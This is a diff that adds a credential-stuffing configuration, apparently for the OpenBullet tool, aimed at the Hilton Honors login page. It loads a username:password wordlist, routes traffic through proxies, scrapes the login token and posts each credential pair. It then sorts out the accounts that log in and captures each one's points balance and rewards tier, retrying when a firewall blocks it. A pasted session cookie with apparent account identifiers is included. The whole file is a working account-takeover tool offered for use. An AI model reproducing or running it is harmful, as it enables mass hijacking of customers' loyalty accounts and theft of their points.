@@ -1,0 +1,57 @@
+[SETTINGS]
+{
+  "Name": "Hilton",
+  "SuggestedBots": 150,
+  "LastModified": "2018-06-11T15:55:59.5694195+00:00",
+  "AdditionalInfo": "",
+  "Author": "Dreamzje [ KEEPIT.ONLINE ]",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_REQUEST REQUEST GET "https://secure3.hilton.com/en/hh/customer/login/index.htm" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" LR "tokenId\" type=\"hidden\" value=\"" "\"" Recursive=FALSE -> VAR "TOKEN" "" "" 
+#POST_REQUEST REQUEST POST "https://secure3.hilton.com/en/hh/customer/login/index.htm" AutoRedirect=TRUE 
+  CONTENT "username=<USER>&password=<PASS>&_rememberMe=on&loginPageTitle=&tokenId=<TOKEN>&partToB=&forwardPageURI=/customer/account/index.htm" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "Cookie: rxVisitor=1525944986043RKHIUPF70DMRJT5KLGUA02U931QHK16Q; mmapi.p.srv=%22ldnvwcgus01%22; visitorId=5e184a0f-abe2-4719-bd62-e65e4af99ea7; forterToken=5815fecc630b4d679827c35f568a6d27_1525944988305__UDF4_6; ftr_ncd=6; sn.vi=3dc809bf-5eae-4055-83cf-233644a0620a; AMCVS_F0C120B3534685700A490D45%40AdobeOrg=1; s_cc=true; AAMC_hilton_0=REGION%7C9; xyz_cr_666_et_100=; sn.tpc=1; notice_preferences=0:; notice_gdpr_prefs=0:; cmapi_gtm_bl=ga-ms-ua-ta-asp-bzi-sp-awct-cts-csm-img-flc-fls-mpm-mpr-m6d-tc-tdc; cmapi_cookie_privacy=permit 1 required; _sdsat_landing_page=https://secure3.hilton.com/en/hh/customer/login/index.htm|1528395181779; _sdsat_session_count=2; _sdsat_traffic_source=http://hiltonhonors3.hilton.com/en/earn-use-points/overview/index.html; _sdsat_MCID=52616290809572681906397493704951472220; aam_uuid=52640482602460942256395341698935279891; GWSESSIONID=JzGXbpRRyJmksvDg965kTdqHSYKv1Q2t6g3dJmyvHHbL1yvpYYdp!-531812274; ak_bmsc=541648813D5DD679C9CECD32B64D10A817373B78AD2E000091911E5BC3F13052~pl8dSQgti4oVcOsgPHocB7mEmh4k36A7nvfOCwhTaqUDZNFqjK1ruLHjDzGKYbsA0+qnm1QKLIdUxgTIG2hMf3cIlX0A2q3rw+OIAqHTP9KBp9IX51vJn9mnVRttWa0hXhyuhv+eEY0ky+Z8TYeuq6Lnz0EJivRhheBWhDbB63JJ0lFXSWvpx97SNezu1AjjxKtYyYR3yhcY/5WHBAyOqYOOe8WxWYbH4H/7y5iGuJR6Y=; bm_sz=17A75D678844DA44F3BD3D6D2FDAC848~QAAQeDs3F2iXDZljAQAALKJo70gPifQzDae3KQv+BLyS7RW3eZVAAqUEAUV68Kzpv+ctZIeBHEoSgKx0MpP2HqKzjhFpUNjhMKWjHo6mHS+H1CPi0sIwsOFoatOuJ63HzEsDD+oRV1IPG9eiZUFDFihAAPLPVozv8m39nZLvnUrpodn2sdczWYGMcKqa4GE=; AMCV_F0C120B3534685700A490D45%40AdobeOrg=-330454231%7CMCIDTS%7C17694%7CMCMID%7C52616290809572681906397493704951472220%7CMCAID%7CNONE%7CMCOPTOUT-1528737204s%7CNONE%7CvVersion%7C3.1.2; s_dfa=hiltonglobalprod; xCsrfToken=7631840661162617677; accountId=643687515; accountTier=Blue; _abck=E3B76F58283CE3C2C8E1103EDD7CF8960216E486262700009812F45A43982A1E~0~/dNwbDSglOnEaESkirlOsR/O+NlAdcrFVnJ4zMZerpM=~-1~-1; __atuvc=3%7C24; __atuvs=5b1e965595eff919002; mmapi.p.uat=%7B%22Cookied%22%3A%22Member_Cookied%22%2C%22loggedin%22%3A%22no%22%2C%22Referrer%22%3A%22Brand.com%22%2C%22SignInSource%22%3A%22Other%22%2C%22Banner_Present%22%3A%22no%22%2C%22Brand%22%3A%22hh%22%2C%22Children%22%3A%22no%22%2C%22RoomNmbr%22%3A%221%22%2C%22FlexDates%22%3A%22false%22%2C%22hotelcode%22%3A%22no%22%2C%22UrgencyMsg%22%3A%22blank%22%2C%22HHDAP%22%3A%22Blank%22%2C%22SwapRates%22%3A%22Blank%22%2C%22StayDuration%22%3A%221%20night%22%2C%22SatStay%22%3A%22no%22%2C%22DaysToBooking%22%3A%220-3%22%2C%22HHTier%22%3A%22Member%22%7D; gpv_v9=HH%3Acustomer%3Alogin%3Aindex; bm_sv=41DD1BB5A380C7A775D3B1AC5EEFB262~QmQ7Tcb9TvLO34701kf2L0ocjWD609h0MeqkB7XvMGFui/LYdhVJcl7bQ+WD69zbFV5HYziZVc564KN+D8pKN5v8VcN4DoL6ZFxS91YclhpTPju3BmL1xgx6R/zQ3ACzhqRwrTpV6MqRdzyYCboQfD6xF5YxsnJLpNeFb3yKNb8=; dtLatC=10; mmcore.tst=0.705; mmapi.p.pd=%222010936871%7CGAAAAApVAgC86tnPMxAAAg%3D%3D%22; _sdsat_lt_pages_viewed=21; _sdsat_pages_viewed=19; dtPC=3$531474935_827h-vFNCUHJBJOHNVCJJFLCKNHCIMTKDPHAHF; rxvt=1528733279075|1528730002184; s_sq=hiltonglobalprod%3D%2526c.%2526a.%2526activitymap.%2526page%253DHH%25253Acustomer%25253Alogin%25253Aindex%2526link%253DSign%252520In%2526region%253DformSignIn%2526pageIDType%253D1%2526.activitymap%2526.a%2526.c%2526pid%253DHH%25253Acustomer%25253Alogin%25253Aindex%2526pidt%253D1%2526oid%253DSign%252520In%2526oidt%253D3%2526ot%253DSUBMIT; dtCookie=3$480D0B1AF5DE38D735AE72BECC2B5806; dtSa=true%7CC%7C-1%7CSign%20In%7C-%7C1528731840690%7C531474935_827%7Chttps%3A%2F%2Fsecure3.hilton.com%2Fen%2Fhh%2Fcustomer%2Flogin%2Findex.htm%7CSign%20In%20-%20Hilton%20Honors%7C1528731479077%7C" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Referer: https://secure3.hilton.com/en/hh/customer/login/index.htm" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Origin: https://secure3.hilton.com" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Connection: keep-alive" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "https://secure3.hilton.com/en/hh/customer/account/index.htm" 
+    KEY ">Sign Out<" 
+  KEYCHAIN Failure OR 
+    KEY "<SOURCE>" DoesNotContain "https://secure3.hilton.com/en/hh/customer/account/index.htm" 
+    KEY "<SOURCE>" DoesNotContain ">Sign Out<" 
+  KEYCHAIN Retry OR 
+    KEY "You don't have permission to access" 
+    KEY "The page you requested has been blocked by a firewall policy restriction." 
+PARSE "<SOURCE>" LR "\"pointsBalance\":\"" "\"" Recursive=FALSE -> CAP "Points Balance" "" "" 
+PARSE "<SOURCE>" LR "\"rewardsTier\":\"" "\"" Recursive=FALSE -> CAP "Rewards Tier" "" "" 
